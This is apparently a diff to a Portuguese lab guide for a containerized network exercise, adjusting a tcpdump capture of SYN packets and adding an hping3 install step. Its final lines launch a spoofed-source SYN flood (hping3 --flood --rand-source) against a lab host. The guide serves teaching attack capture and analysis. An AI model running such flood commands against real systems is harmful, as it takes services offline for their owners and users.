@@ -48,7 +48,8 @@ docker exec -it clab-lab01-cliente ping 192.168.20.1
 Para salvar as evidências do ataque e analisar a falsificação de IPs no Wireshark, inicie o tcpdump gravando diretamente no diretório compartilhado /scripts:
 
 ```
-docker exec -d clab-lab01-firewall tcpdump -i eth1 -n -c 20000 -w /scripts/ataque_ddos.pcap "tcp[tcpflags] & (tcp-syn) != 0"
+docker exec -it clab-lab01-firewall tcpdump -i eth1 -n -c 50 "tcp[tcpflags] & (tcp-syn) != 0 and dst host 192.168.20.10"
+
 ```
 
 * -i eth1: Captura o tráfego que chega pela interface externa (WAN).
@@ -62,6 +63,11 @@ docker exec -d clab-lab01-firewall tcpdump -i eth1 -n -c 20000 -w /scripts/ataqu
 
 ## 🚀 Passo 3: Lançar o Ataque DDoS (hping3 + IP Spoofing)
 Em um quarto terminal no host, inicie o ataque executando a ferramenta a partir do container atacante:
+
+```
+#instalar o hping3 caso seja host não ubuntu
+docker exec -it clab-lab01-atacante apk add hping3 --update-cache --repository http://dl-cdn.alpinelinux.org/alpine/edge/testing
+```
 
 ```
 docker exec -it clab-lab01-atacante hping3 --flood -S -p 80 --rand-source 192.168.20.10
